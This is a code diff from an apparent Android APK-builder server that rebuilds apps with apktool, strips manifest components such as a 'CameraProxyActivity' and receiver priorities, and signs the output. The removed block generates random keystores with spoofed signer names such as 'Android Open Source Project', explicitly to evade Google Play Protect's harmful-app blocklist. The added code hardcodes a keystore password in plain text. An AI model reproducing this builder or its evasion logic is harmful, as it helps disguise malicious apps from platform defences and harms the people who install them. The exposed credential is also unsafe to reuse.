@@ -342,9 +342,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
                 manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*CameraProxyActivity"[^>]*?\/>/g, '');
                 manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*CameraProxyActivity"[^>]*?>[\s\S]*?<\/activity>/g, '');
+                manifestContent = manifestContent.replace(/android:priority="1000"/g, '');
+                manifestContent = manifestContent.replace(/android:priority="999"/g, '');
 
                 fs.writeFileSync(manifestPath, manifestContent);
-                console.log('[APK] Stripped all conditional permissions/services from base manifest');
+                console.log('[APK] Stripped conditional permissions/services & sanitized high receiver priorities from base manifest');
 
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 const permissionInsertPoint = manifestContent.indexOf('<uses-permission android:name="android.permission.FOREGROUND_SERVICE"');
@@ -555,39 +557,15 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Dynamically generate unique SHA256withRSA keystore per build to prevent Play Protect Harmful App blocklist detection
-            await sendUpdate('apk_progress', { step: 'Generating clean cryptographic signature...', progress: 85 });
+            // 6. Sign APK with established developer key usman90.jks
+            await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-
-            const randHex = crypto.randomBytes(6).toString('hex');
-            const dynamicKsPath = path.join(tempDir, `ks_${randHex}.jks`);
-            const ksPass = crypto.randomBytes(12).toString('hex');
-            const ksAlias = `key_${randHex}`;
-
-            const cnPool = [
-                'Android Open Source Project', 'System UI Component',
-                'Mobile Device Tools', 'Global Mobile Technologies',
-                'Android Application Dev', 'Device Security Manager'
-            ];
-            const randomCn = cnPool[Math.floor(Math.random() * cnPool.length)];
-            const dname = `CN=${randomCn}, OU=Mobile Dev, O=${randomCn}, L=Mountain View, ST=California, C=US`;
-
-            const genKeyCmd = `keytool -genkeypair -v -keystore "${dynamicKsPath}" -alias "${ksAlias}" -keyalg RSA -keysize 2048 -sigalg SHA256withRSA -validity 10000 -storepass "${ksPass}" -keypass "${ksPass}" -dname "${dname}"`;
-
-            await new Promise((resolve, reject) => {
-                exec(genKeyCmd, { timeout: 30000 }, (err) => err ? reject(err) : resolve());
-            });
-
-            await sendUpdate('apk_progress', { step: 'Signing application with clean certificate...', progress: 90 });
-            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${dynamicKsPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}"`;
+            const fixedKeystore = path.join(__dirname, 'assets', 'usman90.jks');
+            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${fixedKeystore}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
             });
-
-            if (fs.existsSync(dynamicKsPath)) {
-                try { fs.unlinkSync(dynamicKsPath); } catch (e) {}
-            }
 
             // Find output
             const files = fs.readdirSync(tempDir);
